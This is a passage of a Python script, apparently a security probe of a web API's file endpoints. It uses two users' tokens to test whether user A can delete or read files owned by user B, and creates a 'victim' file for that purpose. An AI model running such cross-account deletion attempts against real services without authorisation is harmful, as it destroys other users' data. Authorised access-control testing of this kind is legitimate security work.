import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','45','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== file 2712 (created by B/230) after A's DELETE ===")
for label,tok in [("A(231)",TA),("B(230)",TB)]:
    c,b=req('GET','/api/v1/files/2712',tok=tok)
    print(f"  {label} GET -> {c} {b[:200].replace(chr(10),' ')}")
print()
print("=== create a fresh B-owned file, then A deletes it ===")
c,b=req('POST','/api/v1/files/s3_upload_signature',
        {"file_name":"zx-bac-victim.pdf","model_name":None,"model_id":None,"content_hash":"x"},tok=TB)
print(f"  B sign -> {c}")
if c=='200':
    d=json.loads(b); fd=d.get('formData') or {}
    print(f"  B key: {fd.get('key')}")
    open('/tmp/b_key','w').write(fd.get('key') or '')
